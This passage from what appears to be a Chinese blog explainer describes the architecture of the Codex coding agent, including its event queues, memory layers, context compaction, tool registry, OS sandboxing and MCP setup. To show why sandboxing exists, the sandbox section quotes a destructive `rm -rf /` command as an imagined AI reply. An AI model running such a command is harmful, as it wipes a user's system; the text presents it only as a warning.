<h4 data-id="heading-3">用大白话解释</h4>
<p>如果把编程比作做菜：</p>
<ul>
<li><strong>普通的 AI 助手</strong>（如 ChatGPT）就像一本菜谱，告诉你怎么做，但你需要自己动手</li>
<li><strong>Codex</strong> 就像一个真正的厨师，不仅告诉你怎么做，还能直接帮你把菜做出来</li>
</ul>
<h4 data-id="heading-4">核心能力</h4>
<ul>
<li>Codex 能做什么？
<ul>
<li>理解代码：阅读和分析你的项目代码</li>
<li>编写代码：自动编写新功能或修复 bug</li>
<li>执行命令：运行测试、构建项目、git 操作等</li>
<li>修改文件：直接编辑、创建、删除文件</li>
<li>搜索信息：在代码库中搜索，甚至进行网络搜索</li>
<li>调用外部工具：通过 MCP 协议连接各种外部服务</li>
</ul>
</li>
</ul>
<h3 data-id="heading-5">整体架构概览</h3>
<p>Codex 采用了 <strong>Monorepo（单一代码仓库）</strong> 的组织方式，主要由 Rust 和 TypeScript 两种语言构建。</p>
<h4 data-id="heading-6">为什么选择 Rust？</h4>

























<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>性能</strong></td><td>Rust 编译成机器码，运行速度极快</td></tr><tr><td><strong>安全</strong></td><td>内存安全保证，避免常见的安全漏洞</td></tr><tr><td><strong>并发</strong></td><td>优秀的异步编程支持，可同时处理多个任务</td></tr><tr><td><strong>跨平台</strong></td><td>一套代码可编译到 macOS、Linux、Windows</td></tr></tbody></table>
<h4 data-id="heading-7">项目结构图</h4>
<pre><code class="hljs language-bash" lang="bash">codex/
├── codex-rs/           <span class="hljs-comment"># Rust 核心代码（45+ 个模块）</span>
│   ├── core/           <span class="hljs-comment"># 核心引擎 - AI 的"大脑"</span>
│   ├── tui/            <span class="hljs-comment"># 终端界面 - 用户交互</span>
│   ├── cli/            <span class="hljs-comment"># 命令行入口</span>
│   ├── <span class="hljs-built_in">exec</span>/           <span class="hljs-comment"># 非交互式执行</span>
│   ├── mcp-server/     <span class="hljs-comment"># MCP 服务器</span>
│   └── ...             <span class="hljs-comment"># 其他支持模块</span>
│
├── sdk/typescript/     <span class="hljs-comment"># TypeScript SDK（给开发者用的库）</span>
├── shell-tool-mcp/     <span class="hljs-comment"># Shell 工具 MCP 实现</span>
└── docs/               <span class="hljs-comment"># 文档</span>
</code></pre>
<h4 data-id="heading-8">架构分层图</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph TB
    subgraph UserInterface["用户接口层"]
        CLI["CLI 命令行"]
        TUI["TUI 终端界面"]
        SDK["TypeScript SDK"]
    end

    subgraph CoreEngine["核心引擎层"]
        Codex["Codex 核心引擎"]
        ModelClient["模型客户端"]
        ContextMgr["上下文管理器"]
        ToolRouter["工具路由器"]
    end

    subgraph ExecutionLayer["执行层"]
        ShellExec["Shell 执行器"]
        FileOps["文件操作"]
        MCPClient["MCP 客户端"]
        WebSearch["网络搜索"]
    end

    subgraph SecurityLayer["安全层"]
        Sandbox["沙箱隔离"]
        ExecPolicy["执行策略"]
        Approval["审批系统"]
    end

    CLI --&gt; Codex
    TUI --&gt; Codex
    SDK --&gt; Codex

    Codex --&gt; ModelClient
    Codex --&gt; ContextMgr
    Codex --&gt; ToolRouter

    ToolRouter --&gt; ShellExec
    ToolRouter --&gt; FileOps
    ToolRouter --&gt; MCPClient
    ToolRouter --&gt; WebSearch

    ShellExec --&gt; Sandbox
    ShellExec --&gt; ExecPolicy
    FileOps --&gt; Sandbox
    FileOps --&gt; Approval
    MCPClient --&gt; Approval

    style UserInterface fill:#E3F2FD,stroke:#1976D2
    style CoreEngine fill:#E8F5E9,stroke:#388E3C
    style ExecutionLayer fill:#FFF3E0,stroke:#F57C00
    style SecurityLayer fill:#FCE4EC,stroke:#C2185B

</code></pre>
<p>Codex 的架构可以分为四层：</p>
<ol>
<li><strong>用户接口层</strong>：你与 Codex 交互的入口（CLI、TUI、SDK）</li>
<li><strong>核心引擎层</strong>：处理 AI 推理、工具调用、上下文管理</li>
<li><strong>执行层</strong>：实际执行命令、修改文件、调用外部服务</li>
<li><strong>安全层</strong>：沙箱隔离、权限控制、执行策略</li>
</ol>
<hr/>
<h3 data-id="heading-9">核心特性详解</h3>
<h4 data-id="heading-10">1. 多模式交互</h4>
<p>Codex 支持三种使用模式：</p>




















<table><thead><tr><th>交互式 TUI</th><th>非交互式 Exec</th><th>SDK 集成</th></tr></thead><tbody><tr><td><strong>实时对话界面</strong></td><td>自动化脚本执行</td><td>嵌入到你的应用</td></tr><tr><td><strong>适合日常开发</strong></td><td>适合 CI/CD</td><td>适合构建产品</td></tr></tbody></table>
<h4 data-id="heading-11">2. 会话管理</h4>
<p>每次与 Codex 的对话都是一个"会话"（Session）。Codex 会：</p>
<ul>
<li>记住你们的对话历史</li>
<li>保存执行过的命令和结果</li>
<li>支持暂停和恢复对话</li>
</ul>
<h4 data-id="heading-12">3. 智能审批</h4>
<p>Codex 不会盲目执行所有命令。对于危险操作，它会：</p>
<pre><code class="hljs language-ini" lang="ini">你: 帮我删除所有日志文件
Codex: 我需要执行 `rm -rf ./logs/*`，这会删除所有日志。
       <span class="hljs-section">[允许执行]</span> <span class="hljs-section">[拒绝]</span> <span class="hljs-section">[白名单此命令]</span>
</code></pre>
<hr/>
<h3 data-id="heading-13">底层协议与通信机制</h3>
<h4 data-id="heading-14">提交队列/事件队列（SQ/EQ）模式</h4>
<p>Codex 内部使用了一种高效的异步通信模式：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
sequenceDiagram
    participant User as 用户/TUI
    participant SQ as 提交队列 (SQ)
    participant Engine as Codex 核心引擎
    participant LLM as 大语言模型
    participant Tools as 工具系统
    participant EQ as 事件队列 (EQ)

    User-&gt;&gt;SQ: 提交用户输入
    Note over SQ: Op::UserTurn

    SQ-&gt;&gt;Engine: 异步接收提交
    Engine-&gt;&gt;LLM: 调用模型 API

    LLM--&gt;&gt;Engine: 流式响应
    Engine-&gt;&gt;EQ: 发送 AgentMessage 事件
    EQ--&gt;&gt;User: 实时显示 AI 回复

    LLM--&gt;&gt;Engine: 工具调用请求
    Engine-&gt;&gt;Tools: 执行工具
    Engine-&gt;&gt;EQ: 发送 ExecApprovalRequest
    EQ--&gt;&gt;User: 请求用户批准

    User-&gt;&gt;SQ: 提交批准决定
    SQ-&gt;&gt;Engine: 接收批准

    Tools--&gt;&gt;Engine: 工具执行结果
    Engine-&gt;&gt;EQ: 发送 ExecCommandOutput
    EQ--&gt;&gt;User: 显示执行结果

    Engine-&gt;&gt;LLM: 继续推理
    LLM--&gt;&gt;Engine: 最终响应
    Engine-&gt;&gt;EQ: 发送 TurnCompleted
    EQ--&gt;&gt;User: 显示完成状态

</code></pre>
<p><strong>用大白话解释</strong>：</p>
<p>想象一家餐厅：</p>
<ul>
<li><strong>提交队列（SQ）</strong> 就像顾客下单的窗口</li>
<li><strong>Codex 核心引擎</strong> 就像厨房</li>
<li><strong>事件队列（EQ）</strong> 就像出餐窗口</li>
</ul>
<p>顾客下单后不需要等在窗口，可以去座位上等。厨房做好菜后，通过出餐窗口通知顾客取餐。</p>
<h4 data-id="heading-15">核心代码结构</h4>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 简化版的 Codex 核心结构</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Codex</span> {
    <span class="hljs-comment">// 提交队列：接收用户输入</span>
    tx_sub: Sender&lt;Submission&gt;,
    <span class="hljs-comment">// 事件队列：发送处理结果</span>
    rx_event: Receiver&lt;Event&gt;,
}
</code></pre>
<h4 data-id="heading-16">事件类型</h4>
<p>Codex 定义了丰富的事件类型来描述各种操作：</p>






























<table><thead><tr><th>事件类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>AgentMessage</code></td><td>AI 的回复</td><td>"我来帮你修复这个 bug"</td></tr><tr><td><code>ExecCommandOutput</code></td><td>命令执行结果</td><td>测试运行的输出</td></tr><tr><td><code>PatchApprovalRequest</code></td><td>请求批准文件修改</td><td>修改 config.js</td></tr><tr><td><code>TokenCount</code></td><td>Token 使用统计</td><td>输入 1000，输出 500</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-17">记忆系统：如何记住对话</h3>
<h4 data-id="heading-18">问题：AI 的"健忘症"</h4>
<p>大语言模型本身是"无状态"的，每次调用都是全新的开始。就像一个失忆的人，每天早上醒来都不记得昨天发生了什么。</p>
<h4 data-id="heading-19">解决方案：持久化历史</h4>
<p>Codex 通过多层记忆系统解决这个问题：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph TB
    subgraph ShortTerm["短期记忆 - 上下文管理器"]
        CM["ContextManager"]
        Items["对话项目列表"]
        TokenInfo["Token 统计"]
        CM --&gt; Items
        CM --&gt; TokenInfo
    end

    subgraph MediumTerm["中期记忆 - 消息历史"]
        History["history.jsonl"]
        Entry1["session_id + timestamp + text"]
        Entry2["session_id + timestamp + text"]
        Entry3["..."]
        History --&gt; Entry1
        History --&gt; Entry2
        History --&gt; Entry3
    end

    subgraph LongTerm["长期记忆 - 会话持久化"]
        Sessions["~/.codex/sessions/"]
        Session1["session_abc.json"]
        Session2["session_xyz.json"]
        Sessions --&gt; Session1
        Sessions --&gt; Session2
    end

    subgraph ProjectMemory["项目记忆 - AGENTS.md"]
        AgentsMD["AGENTS.md"]
        Rules["项目规范"]
        Constraints["约束条件"]
        AgentsMD --&gt; Rules
        AgentsMD --&gt; Constraints
    end

    User["用户"] --&gt; CM
    CM --&gt;|"保存到"| History
    CM --&gt;|"持久化"| Sessions
    AgentsMD --&gt;|"加载到"| CM

    style ShortTerm fill:#E3F2FD,stroke:#1976D2
    style MediumTerm fill:#E8F5E9,stroke:#388E3C
    style LongTerm fill:#FFF3E0,stroke:#F57C00
    style ProjectMemory fill:#F3E5F5,stroke:#7B1FA2

</code></pre>
<h4 data-id="heading-20">三层记忆架构</h4>
<h5 data-id="heading-21">1. 短期记忆：上下文管理器（ContextManager）</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContextManager</span> {
    <span class="hljs-comment">// 当前对话的所有项目（从旧到新排序）</span>
    items: <span class="hljs-type">Vec</span>&lt;ResponseItem&gt;,
    <span class="hljs-comment">// Token 使用信息</span>
    token_info: <span class="hljs-type">Option</span>&lt;TokenUsageInfo&gt;,
}
</code></pre>
<p><strong>作用</strong>：管理当前对话中的所有消息、工具调用和结果。</p>
<h5 data-id="heading-22">2. 中期记忆：消息历史（Message History）</h5>
<p>存储位置：<code>~/.codex/history.jsonl</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"session_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"abc123"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"ts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1699123456</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"帮我写一个排序函数"</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">{</span><span class="hljs-attr">"session_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"abc123"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"ts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1699123460</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"好的，这是冒泡排序的实现..."</span><span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>特点</strong>：</p>
<ul>
<li>使用 JSONL 格式（每行一个 JSON）</li>
<li>原子写入（不会出现写一半的情况）</li>
<li>自动管理大小（超过限制会清理旧记录）</li>
</ul>
<h5 data-id="heading-23">3. 长期记忆：会话持久化</h5>
<p>存储位置：<code>~/.codex/sessions/</code></p>
<p>每个会话保存为独立的 JSON 文件，包含完整的对话状态，支持随时恢复。</p>
<h4 data-id="heading-24">项目文档记忆：AGENTS.md</h4>
<p>Codex 还会读取项目中的 <code>AGENTS.md</code> 文件，了解项目的特殊规则：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># AGENTS.md</span>

<span class="hljs-section">## 项目规范</span>
<span class="hljs-bullet">-</span> 使用 TypeScript 编写
<span class="hljs-bullet">-</span> 所有函数必须有注释
<span class="hljs-bullet">-</span> 测试覆盖率要求 80% 以上

<span class="hljs-section">## 禁止操作</span>
<span class="hljs-bullet">-</span> 不要修改 .env 文件
<span class="hljs-bullet">-</span> 不要删除 migrations 文件夹
</code></pre>
<hr/>
<h3 data-id="heading-25">上下文工程：智能管理有限的"脑容量"</h3>
<h4 data-id="heading-26">问题：上下文窗口的限制</h4>
<p>大语言模型有一个"上下文窗口"限制，就像人的工作记忆一样有限。如果对话太长，模型就会"记不住"前面的内容。</p>
<pre><code class="hljs language-css" lang="css">┌────────────────────────────────────────────────────────────┐
│                    上下文窗口示意图                          │
├────────────────────────────────────────────────────────────┤
│  <span class="hljs-selector-attr">[系统提示]</span> <span class="hljs-selector-attr">[用户1]</span> <span class="hljs-selector-attr">[AI1]</span> <span class="hljs-selector-attr">[用户2]</span> <span class="hljs-selector-attr">[AI2]</span> ... <span class="hljs-selector-attr">[用户N]</span> <span class="hljs-selector-attr">[AI N]</span>  │
│  ←─────────────── 有限的容量 ──────────────────→           │
│                                                            │
│  超出容量时：旧的内容会被"遗忘"                              │
└────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-27">解决方案：智能上下文管理</h4>
<p>Codex 采用多种策略来最大化利用有限的上下文：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
flowchart TD
    Start["开始新的对话轮次"] --&gt; Check{"检查上下文大小"}

    Check --&gt;|"&lt; 80% 窗口"| Normal["正常添加内容"]
    Check --&gt;|"&gt;= 80% 窗口"| Strategy["应用优化策略"]

    Strategy --&gt; S1["策略1: Token 估算"]
    Strategy --&gt; S2["策略2: 智能截断"]
    Strategy --&gt; S3["策略3: 对话压缩"]
    Strategy --&gt; S4["策略4: 环境差异"]

    S1 --&gt; |"每4字节≈1 token"| Estimate["快速估算大小"]
    S2 --&gt; |"保留头尾"| Truncate["删除中间内容"]
    S3 --&gt; |"AI 生成摘要"| Compact["压缩历史对话"]
    S4 --&gt; |"只发送变化"| Diff["差异化更新"]

    Estimate --&gt; Optimize["优化后的上下文"]
    Truncate --&gt; Optimize
    Compact --&gt; Optimize
    Diff --&gt; Optimize

    Normal --&gt; Send["发送给模型"]
    Optimize --&gt; Send

    Send --&gt; Response["获取模型响应"]
    Response --&gt; Update["更新 Token 统计"]
    Update --&gt; End["完成"]

    style Start fill:#4CAF50,color:#fff
    style End fill:#4CAF50,color:#fff
    style Strategy fill:#FF9800,color:#fff
    style Check fill:#2196F3,color:#fff

</code></pre>
<h4 data-id="heading-28">策略 1：Token 估算</h4>
<p>不使用精确的 tokenizer（太慢），而是用简单的启发式算法：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">const</span> APPROX_BYTES_PER_TOKEN: <span class="hljs-type">usize</span> = <span class="hljs-number">4</span>;

<span class="hljs-comment">// 估算 token 数量：每 4 个字节约等于 1 个 token</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">approx_token_count</span>(text: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
    (text.<span class="hljs-title function_ invoke__">len</span>() + <span class="hljs-number">3</span>) / <span class="hljs-number">4</span>  <span class="hljs-comment">// 向上取整</span>
}
</code></pre>
<h4 data-id="heading-29">策略 2：智能截断</h4>
<p>对于过长的输出，保留头尾，删除中间：</p>
<pre><code class="hljs language-css" lang="css">原始输出（<span class="hljs-number">10000</span> 字符）：
┌─────────────────────────────────────────────────────────────┐
│ <span class="hljs-selector-attr">[头部 1000 字符]</span> <span class="hljs-selector-attr">[...中间内容...]</span> <span class="hljs-selector-attr">[尾部 1000 字符]</span>          │
└─────────────────────────────────────────────────────────────┘

截断后（<span class="hljs-number">2500</span> 字符）：
┌─────────────────────────────────────────────────────────────┐
│ <span class="hljs-selector-attr">[头部 1000 字符]</span> ... <span class="hljs-selector-attr">[省略 7500 字符]</span> ... <span class="hljs-selector-attr">[尾部 1000 字符]</span>  │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<h4 data-id="heading-30">策略 3：对话压缩（Compaction）</h4>
<p>当上下文接近满时，Codex 会请求 AI 对之前的对话进行"摘要"：</p>
<pre><code class="hljs language-makefile" lang="makefile">压缩前：
<span class="hljs-section">用户: 帮我看看为什么测试失败</span>
<span class="hljs-section">AI: 好的，让我运行测试... 测试结果是... 问题在于...</span>
<span class="hljs-section">用户: 修复它</span>
<span class="hljs-section">AI: 我修改了文件... 现在测试通过了</span>
<span class="hljs-section">用户: 还有其他问题吗？</span>
...（很多轮对话）

压缩后：
[摘要] 用户请求修复测试失败问题，经过分析发现是类型错误，
已修改 src/utils.ts 第 42 行，测试现已通过。
</code></pre>
<h4 data-id="heading-31">策略 4：环境上下文差异</h4>
<p>只发送变化的部分，而不是每次都发送完整的环境信息：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- 首次发送完整上下文 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">environment_context</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cwd</span>&gt;</span>/path/to/project<span class="hljs-tag">&lt;/<span class="hljs-name">cwd</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">sandbox_mode</span>&gt;</span>workspace-write<span class="hljs-tag">&lt;/<span class="hljs-name">sandbox_mode</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">shell</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">shell</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">environment_context</span>&gt;</span>

<span class="hljs-comment">&lt;!-- 之后只发送变化 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">environment_context_diff</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">cwd</span>&gt;</span>/path/to/project/src<span class="hljs-tag">&lt;/<span class="hljs-name">cwd</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 只有工作目录变了 --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">environment_context_diff</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-32">工具系统：让 AI 能够"动手"</h3>
<h4 data-id="heading-33">为什么需要工具？</h4>
<p>大语言模型本身只能"说"，不能"做"。工具系统就是给 AI 装上"手"，让它能够：</p>
<ul>
<li>执行 shell 命令</li>
<li>读写文件</li>
<li>搜索代码</li>
<li>调用外部服务</li>
</ul>
<h4 data-id="heading-34">工具架构</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph LR
    subgraph AI["AI 模型"]
        LLM["大语言模型"]
        Decision["决策: 需要使用工具"]
    end

    subgraph Router["工具路由器"]
        Registry["工具注册表"]
        Dispatch["分发器"]
    end

    subgraph Tools["内置工具"]
        Shell["Shell 执行器"]
        ReadFile["文件读取"]
        ApplyPatch["补丁应用"]
        GrepFiles["文件搜索"]
        ListDir["目录列表"]
        ViewImage["图片查看"]
    end

    subgraph External["外部工具"]
        MCP["MCP 工具"]
        WebSearch["网络搜索"]
    end

    subgraph Security["安全检查"]
        Policy["执行策略"]
        Sandbox["沙箱隔离"]
        Approval["用户审批"]
    end

    LLM --&gt; Decision
    Decision --&gt; Registry
    Registry --&gt; Dispatch

    Dispatch --&gt; Shell
    Dispatch --&gt; ReadFile
    Dispatch --&gt; ApplyPatch
    Dispatch --&gt; GrepFiles
    Dispatch --&gt; ListDir
    Dispatch --&gt; ViewImage
    Dispatch --&gt; MCP
    Dispatch --&gt; WebSearch

    Shell --&gt; Policy
    ApplyPatch --&gt; Approval
    MCP --&gt; Approval

    Policy --&gt; Sandbox
    Approval --&gt; Sandbox

    Sandbox --&gt; Result["执行结果"]
    Result --&gt; LLM

    style AI fill:#E3F2FD,stroke:#1976D2
    style Router fill:#E8F5E9,stroke:#388E3C
    style Tools fill:#FFF3E0,stroke:#F57C00
    style External fill:#F3E5F5,stroke:#7B1FA2
    style Security fill:#FCE4EC,stroke:#C2185B

</code></pre>
<h4 data-id="heading-35">内置工具列表</h4>


















































<table><thead><tr><th>工具名称</th><th>功能</th><th>示例</th></tr></thead><tbody><tr><td><code>shell</code></td><td>执行命令</td><td><code>npm test</code>, <code>git status</code></td></tr><tr><td><code>read_file</code></td><td>读取文件</td><td>查看 <code>config.json</code></td></tr><tr><td><code>list_dir</code></td><td>列出目录</td><td>浏览项目结构</td></tr><tr><td><code>apply_patch</code></td><td>修改文件</td><td>修复代码 bug</td></tr><tr><td><code>grep_files</code></td><td>搜索文件</td><td>查找函数定义</td></tr><tr><td><code>view_image</code></td><td>查看图片</td><td>分析截图</td></tr><tr><td><code>web_search</code></td><td>网络搜索</td><td>查找文档</td></tr><tr><td><code>mcp_tool</code></td><td>调用 MCP 工具</td><td>使用外部服务</td></tr></tbody></table>
<h4 data-id="heading-36">工具调用流程</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> AI 决定使用工具
   └── "我需要运行测试来验证修复"

<span class="hljs-bullet">2.</span> 生成工具调用
   └── { tool: "shell", command: "npm test" }

<span class="hljs-bullet">3.</span> 权限检查
   └── 检查执行策略和沙箱规则

<span class="hljs-bullet">4.</span> 执行工具
   └── 在沙箱中运行命令

<span class="hljs-bullet">5.</span> 返回结果
   └── 将输出返回给 AI

<span class="hljs-bullet">6.</span> AI 继续推理
   └── "测试通过了，修复成功！"
</code></pre>
<h4 data-id="heading-37">工具注册机制</h4>
<p>Codex 使用统一的工具注册表来管理所有工具：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ToolRegistry</span> {
    handlers: HashMap&lt;ToolType, <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> ToolHandler&gt;&gt;,
}

<span class="hljs-keyword">pub</span> <span class="hljs-keyword">trait</span> <span class="hljs-title class_">ToolHandler</span>: <span class="hljs-built_in">Send</span> + <span class="hljs-built_in">Sync</span> {
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">handle</span>(
        &amp;<span class="hljs-keyword">self</span>,
        invocation: ToolInvocation
    ) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;ToolOutput, ToolError&gt;;
}
</code></pre>
<hr/>
<h3 data-id="heading-38">安全沙箱：给 AI 一个安全的"游乐场"</h3>
<h4 data-id="heading-39">为什么需要沙箱？</h4>
<p>让 AI 执行命令是危险的。想象一下：</p>
<pre><code class="hljs language-bash" lang="bash">用户: 帮我清理项目
AI: 好的，我来执行 <span class="hljs-built_in">rm</span> -rf /  <span class="hljs-comment"># 危险！会删除整个系统！</span>
</code></pre>
<p>沙箱就是为了防止这种灾难性的操作。</p>
<h4 data-id="heading-40">沙箱原理</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph TB
    subgraph Request["命令请求"]
        Cmd["执行命令: npm test"]
    end

    subgraph PolicyCheck["策略检查"]
        EP["执行策略引擎"]
        Decision{"决策"}
    end

    subgraph SandboxSelect["沙箱选择"]
        Platform{"操作系统?"}
        MacOS["macOS: Seatbelt"]
        Linux["Linux: Landlock + Seccomp"]
        Windows["Windows: RestrictedToken"]
    end

    subgraph Permissions["权限控制"]
        FS["文件系统访问"]
        Net["网络访问"]
        Proc["进程权限"]
    end

    subgraph Execution["执行环境"]
        Isolated["隔离进程"]
        Result["执行结果"]
    end

    Cmd --&gt; EP
    EP --&gt; Decision

    Decision --&gt;|"allow"| Platform
    Decision --&gt;|"prompt"| UserApproval["用户审批"]
    Decision --&gt;|"forbidden"| Blocked["拒绝执行"]

    UserApproval --&gt;|"批准"| Platform
    UserApproval --&gt;|"拒绝"| Blocked

    Platform --&gt;|"darwin"| MacOS
    Platform --&gt;|"linux"| Linux
    Platform --&gt;|"win32"| Windows

    MacOS --&gt; FS
    Linux --&gt; FS
    Windows --&gt; FS

    FS --&gt; Net
    Net --&gt; Proc
    Proc --&gt; Isolated
    Isolated --&gt; Result

    style Request fill:#E3F2FD,stroke:#1976D2
    style PolicyCheck fill:#FFF3E0,stroke:#F57C00
    style SandboxSelect fill:#E8F5E9,stroke:#388E3C
    style Permissions fill:#FCE4EC,stroke:#C2185B
    style Execution fill:#F3E5F5,stroke:#7B1FA2
    style Blocked fill:#FFCDD2,stroke:#D32F2F

</code></pre>
<h4 data-id="heading-41">三种沙箱策略</h4>





























<table><thead><tr><th>策略</th><th>文件权限</th><th>网络权限</th><th>适用场景</th></tr></thead><tbody><tr><td><code>read-only</code></td><td>只读</td><td>禁止</td><td>代码审查</td></tr><tr><td><code>workspace-write</code></td><td>工作区可写</td><td>可配置</td><td>日常开发</td></tr><tr><td><code>danger-full-access</code></td><td>完全访问</td><td>允许</td><td>特殊场景</td></tr></tbody></table>
<h4 data-id="heading-42">跨平台沙箱实现</h4>
<p>Codex 针对不同操作系统使用不同的沙箱技术：</p>
<h5 data-id="heading-43">macOS: Seatbelt</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 生成 SBPL（Seatbelt Profile Language）策略</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">profile</span> = <span class="hljs-built_in">format!</span>(<span class="hljs-string">r#"
    (version 1)
    (deny default)
    (allow file-read* (subpath "{writable_root}"))
    (allow file-write* (subpath "{writable_root}"))
    (deny network*)
"#</span>);
</code></pre>
<h5 data-id="heading-44">Linux: Landlock + Seccomp</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Landlock：限制文件系统访问</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">ruleset</span> = Ruleset::<span class="hljs-title function_ invoke__">new</span>()
    .<span class="hljs-title function_ invoke__">handle_access</span>(AccessFs::ReadFile)?
    .<span class="hljs-title function_ invoke__">create</span>()?;

<span class="hljs-comment">// Seccomp：阻止危险的系统调用</span>
<span class="hljs-title function_ invoke__">seccomp_rule_add</span>(ctx, <span class="hljs-title function_ invoke__">SCMP_ACT_ERRNO</span>(EPERM),
    <span class="hljs-title function_ invoke__">SCMP_SYS</span>(connect), <span class="hljs-number">0</span>)?;  <span class="hljs-comment">// 禁止网络连接</span>
</code></pre>
<h5 data-id="heading-45">Windows: RestrictedToken</h5>
<p>使用 Windows 的受限令牌和 ACL（访问控制列表）来限制权限。</p>
<h4 data-id="heading-46">沙箱绕过机制</h4>
<p>有时候确实需要执行受限的操作，Codex 提供了安全的升级路径：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> AI 请求执行需要额外权限的命令
<span class="hljs-bullet">2.</span> 向用户显示权限提升请求
<span class="hljs-bullet">3.</span> 用户确认后，在沙箱外执行
<span class="hljs-bullet">4.</span> 记录操作日志
</code></pre>
<hr/>
<h3 data-id="heading-47">MCP 协议：连接外部世界的桥梁</h3>
<h4 data-id="heading-48">什么是 MCP？</h4>
<p><strong>MCP（Model Context Protocol）</strong> 是一个开放协议，让 AI 助手能够与外部工具和服务交互。可以把它想象成 AI 世界的"USB 接口"。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">
graph LR
    subgraph CodexCore["Codex 核心"]
        MCPManager["MCP 连接管理器"]
        ToolRouter["工具路由器"]
    end

    subgraph MCPClients["MCP 客户端连接"]
        Client1["RmcpClient #1"]
        Client2["RmcpClient #2"]
        Client3["RmcpClient #3"]
    end

    subgraph Transport["传输层"]
        Stdio["Stdio 传输"]
        HTTP["HTTP 传输"]
        OAuth["OAuth 认证"]
    end

    subgraph MCPServers["MCP 服务器"]
        GitHub["GitHub 服务器"]
        Slack["Slack 服务器"]
        Custom["自定义服务器"]
    end

    subgraph Protocol["协议层"]
        Init["1. 初始化握手"]
        ListTools["2. 获取工具列表"]
        CallTool["3. 调用工具"]
        Result["4. 返回结果"]
    end

    ToolRouter --&gt; MCPManager
    MCPManager --&gt; Client1
    MCPManager --&gt; Client2
    MCPManager --&gt; Client3

    Client1 --&gt; Stdio
    Client2 --&gt; HTTP
    Client3 --&gt; OAuth

    Stdio --&gt; GitHub
    HTTP --&gt; Custom
    OAuth --&gt; Slack

    GitHub --&gt; Init
    Init --&gt; ListTools
    ListTools --&gt; CallTool
    CallTool --&gt; Result

    style CodexCore fill:#E3F2FD,stroke:#1976D2
    style MCPClients fill:#E8F5E9,stroke:#388E3C
    style Transport fill:#FFF3E0,stroke:#F57C00
    style MCPServers fill:#F3E5F5,stroke:#7B1FA2
    style Protocol fill:#E0F7FA,stroke:#00838F


</code></pre>
<h4 data-id="heading-49">MCP 的角色</h4>
<p>Codex 可以同时作为：</p>
<ul>
<li><strong>MCP 客户端</strong>：调用其他 MCP 服务器提供的工具</li>
<li><strong>MCP 服务器</strong>：让其他应用调用 Codex 的能力</li>
</ul>
<h4 data-id="heading-50">连接外部服务示例</h4>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-comment"># ~/.codex/config.toml</span>

<span class="hljs-section">[mcp_servers.github]</span>
<span class="hljs-attr">enabled</span> = <span class="hljs-literal">true</span>

<span class="hljs-section">[mcp_servers.github.transport]</span>
<span class="hljs-attr">type</span> = <span class="hljs-string">"stdio"</span>
<span class="hljs-attr">command</span> = <span class="hljs-string">"npx"</span>
<span class="hljs-attr">args</span> = [<span class="hljs-string">"@modelcontextprotocol/server-github"</span>]
</code></pre>
<p>配置后，Codex 就能使用 GitHub 的功能：</p>
